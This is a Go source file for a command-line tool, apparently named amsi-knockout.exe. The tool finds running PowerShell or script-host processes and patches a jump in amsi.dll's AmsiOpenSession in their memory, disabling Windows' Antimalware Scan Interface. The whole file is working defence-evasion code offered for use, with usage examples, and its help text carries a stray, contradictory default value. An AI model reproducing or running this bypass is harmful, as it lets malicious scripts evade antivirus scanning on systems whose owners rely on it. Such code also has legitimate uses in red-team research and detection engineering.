package main

import (
	"fmt"
	"os"
	"flag"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Technique inspired by: https://github.com/ZeroMemoryEx/Amsi-Killer

// 00007FFAE957C650 | 48:85D2 | test rdx, rdx |
// 00007FFAE957C653 | 74 3F | je amsi.7FFAE957C694 |
// 00007FFAE957C655 | 48 : 85C9 | test rcx, rcx |
// 00007FFAE957C658 | 74 3A | je amsi.7FFAE957C694 |
// 00007FFAE957C65A | 48 : 8379 08 00 | cmp qword ptr ds : [rcx + 8] , 0 |
// 00007FFAE957C65F | 74 33 | je amsi.7FFAE957C694 |

// Pattern of the exact addresses of the jump instruction 
// by searching for the first byte
var pattern = []byte{0x48, '?', '?', 0x74, '?', 0x48, '?', '?', 0x74}

// Flag to patch AMSI
var patch = []byte{0xEB}


// Bypasses AMSI 
// processName: String which holds the name of the process to patch
// Returns nothing (void)
func AMSIBypass(processName string) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		fmt.Println("[!] Error creating snapshot:", err)
		return
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		fmt.Println("[!] Error getting first process:", err)
		return
	}

	for {
		exeFile := windows.UTF16ToString(entry.ExeFile[:])
		if exeFile == processName {
			if bypassProcess(entry.ProcessID) {
				fmt.Printf("[+] AMSI patched %d\n", entry.ProcessID)
			} else {
				fmt.Println("[!] Patch failed")
			}
		}
		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}
}


// Performs the actual bypass
// pid: Uint32 which contains the current process ID
// Returns boolean which indicates success or failure
func bypassProcess(pid uint32) bool {
	if pid == 0 {
		return false
	}

	const PROCESS_VM_OPERATION = 0x0008
	const PROCESS_VM_READ = 0x0010
	const PROCESS_VM_WRITE = 0x0020

	handle, err := windows.OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE, false, pid)
	if err != nil {
		fmt.Println("[!] Error opening process:", err)
		return false
	}
	defer windows.CloseHandle(handle)

	hModule, err := windows.LoadLibrary("amsi.dll")
	if err != nil {
		fmt.Println("[!] Error loading library:", err)
		return false
	}
	defer windows.FreeLibrary(hModule)

	amsiAddr, err := windows.GetProcAddress(hModule, "AmsiOpenSession")
	if err != nil {
		fmt.Println("[!] Error getting procedure address:", err)
		return false
	}

	buffer := make([]byte, 1024)
	var bytesRead uintptr
	err = windows.ReadProcessMemory(handle, amsiAddr, &buffer[0], 1024, &bytesRead)
	if err != nil {
		fmt.Println("[!] Error reading process memory:", err)
		return false
	}

	matchAddress := searchPattern(buffer, pattern)
	if matchAddress == -1 {
		return false
	}

	updateAmsiAddr := uintptr(amsiAddr) + uintptr(matchAddress)
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(handle, updateAmsiAddr, &patch[0], 1, &bytesWritten)
	if err != nil {
		fmt.Println("[!] Error writing process memory:", err)
		return false
	}

	return true
}


// Searchers for given pattern in the given buffer
// buffer: []byte Array with a chunk of the process memory
// pattern: []byte Array with defined pattern to search for
// Returns int
func searchPattern(buffer []byte, pattern []byte) int {
	for i := 0; i < len(buffer)-len(pattern); i++ {
		matched := true
		for j := 0; j < len(pattern); j++ {
			if pattern[j] != '?' && buffer[i+j] != pattern[j] {
				matched = false
				break
			}
		}
		if matched {
			return i + 3
		}
	}
	return -1
}

// init, get called automatic before main()
func init() {
	flag.Usage = func() {
		h := "amsi-knockout.exe is a command line tool to bypass AMSI permanent for the given process name.\n\n"

		h += "Usage:\n"
		h += "  amsi-knockout.exe [OPTIONS]\n\n"

		h += "Options:\n"
		h += "  --help          Print help/usage informations\n"
		h += "  --processName   Process name where AMSI will be bypassed,DEFAULT: 'subdomains'\n"
		h += "                  DEFAULT: 'powershell.exe', POSSIBLE VALUES: pwsh.exe, powershell.exe, wscript.exe or cscript.exe\n"
		h += "\n"

		h += "Examples:\n"
		h += "  amsi-knockout.exe\n"
		h += "  amsi-knockout.exe --processName 'powershell.exe'\n"
		h += "  amsi-knockout.exe --processName 'wscript.exe'\n"
		h += "  amsi-knockout.exe --help\n"
		h += "  amsi-knockout.exe --version\n"

		fmt.Fprintf(os.Stderr, h)
	}
}

func main() {
	// Defining available flags
	processName := flag.String("processName", "powershell.exe", "Name of the process to search and bypass AMSI")

	// Parse all falgs
	flag.Parse()

	fmt.Println("[i] Try to bypass AMSI ...")
	fmt.Println("[i] Processname:", *processName)

	AMSIBypass(*processName);
}
